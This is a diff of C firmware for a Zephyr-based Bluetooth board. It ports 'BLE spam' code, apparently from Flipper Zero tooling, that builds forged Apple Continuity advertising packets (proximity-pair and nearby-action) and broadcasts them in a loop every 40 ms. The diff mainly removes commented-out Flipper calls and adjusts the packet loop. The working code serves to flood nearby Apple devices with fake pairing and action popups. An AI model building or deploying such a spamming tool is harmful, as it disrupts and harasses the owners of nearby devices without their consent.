@@ -29,7 +29,7 @@
 #include <bluetooth/gatt_dm.h>
 #include <sdc_hci_vs.h>
 
-//ovo sam ja doda
+//--------------Added by me
 #include <zephyr/random/rand32.h>
 #include <zephyr/kernel.h>
 #include <zephyr/drivers/gpio.h>
@@ -37,33 +37,27 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdbool.h>
+
 #define LED0_NODE DT_ALIAS(led0)
 #define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
-
+#define COUNT_OF(arr) (sizeof(arr) / sizeof((arr)[0]))
 //------------------
 
 #define DEVICE_NAME	CONFIG_BT_DEVICE_NAME
 #define DEVICE_NAME_LEN (sizeof(DEVICE_NAME) - 1)
-#define INTERVAL_MIN      0x6    /* 6 units,  7.5 ms */ 
-#define INTERVAL_MIN_US  7500    /* 7.5 ms */
-#define INTERVAL_LLPM  0x0D01    /* Proprietary  1 ms */
-#define INTERVAL_LLPM_US 1000
 
-#define COUNT_OF(arr) (sizeof(arr) / sizeof((arr)[0]))
+
+
 typedef struct Attack Attack;
 
 static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
 
-//#include "../ble_spam.h"
 
 typedef struct {
     Attack* attack;
     uint8_t byte_store[3];
     
 } Ctx;
-
-//#include <furi_hal_random.h>
-//#include <core/core_defines.h>
 
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~_base.h
@@ -438,16 +432,12 @@ static void make_packet_proximity_pair(uint8_t* _size, uint8_t** _packet, Payloa
 
 
 
-
-
 static void make_packet_action_modal(uint8_t* _size, uint8_t** _packet, Payload* payload) {
     ContinuityType type;
     type = ContinuityTypeNearbyAction;
     uint8_t size = packet_sizes[type];
     uint8_t* packet = malloc(size);
     uint8_t i = 0;
-
-    //FINALNO OVO RADI
 
     
     packet[i++] = 0x4C; // Company ID (Apple, Inc.)
@@ -489,7 +479,6 @@ static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
         type = types[rand() % COUNT_OF(types)];
 
     }
-    type = ContinuityTypeProximityPair; // OVOOOOOOOOOOOOOOOOOOOOOOO SI TI NADODA DA BUDES SIGURAN DA JE UVIK OVO
 
     uint8_t size = packet_sizes[type];
     uint8_t* packet = malloc(size);
@@ -700,7 +689,6 @@ const Protocol protocol_continuity = {
 
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ble-spam.c
-static uint16_t delays[] = {20, 50, 100, 200};
 
 
 typedef struct {
@@ -744,11 +732,9 @@ int main(void* _ctx) {
     uint8_t size;
     uint16_t delay;
     uint8_t* packet;
-    //Payload*  payload = &attacks[state->index].payload;
     Payload* payload = &attack.payload;
-
     const Protocol* protocol = attack.protocol;
-    //if(!payload->random_mac) furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
+   
 	int err=bt_enable(NULL);
 	if(err){
 		printk("Bluetooth init failed (err %d)\n", err);
@@ -756,22 +742,11 @@ int main(void* _ctx) {
 	}
 
 
-    while(/*state->advertising*/true) {
-		k_msleep(40);
+    while(true) {
 
-        // if(protocol) {
-        //     if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
-        //         payload->bruteforce.counter = 0;
-        //         payload->bruteforce.value =
-        //             (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
-        //     }
-        //     protocol->make_packet(&size, &packet, payload);
-        // } else { //ovo ce se uvik izvrsit u ovom slucaju??
-        //     protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
-        // }
+		k_msleep(40);
         protocol->make_packet(&size, &packet, NULL);
 		
-        //furi_hal_bt_custom_adv_set(packet, size); -- ovo minjamo s ovim ispod
 		struct bt_data ad[] = {
                 BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
 				BT_DATA(BT_DATA_MANUFACTURER_DATA, packet, size),
@@ -782,13 +757,9 @@ int main(void* _ctx) {
         static const struct bt_data sd[] = {
 	        BT_DATA(BT_DATA_NAME_COMPLETE, DEVICE_NAME, DEVICE_NAME_LEN),
         };
-        free(packet);
 
-        //if(payload->random_mac) furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
-        delay = delays[0]; //stavljeno na 20ms
-        //furi_hal_bt_custom_adv_start(delay, delay, 0x00, state->mac, 0x1F);
-        //furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
-        //furi_hal_bt_custom_adv_stop();
+
+        free(packet);
 		
 		bt_le_adv_start(BT_LE_ADV_NCONN_CUSTOM, ad, ARRAY_SIZE(ad), NULL, 0);
 		ret = gpio_pin_toggle_dt(&led);
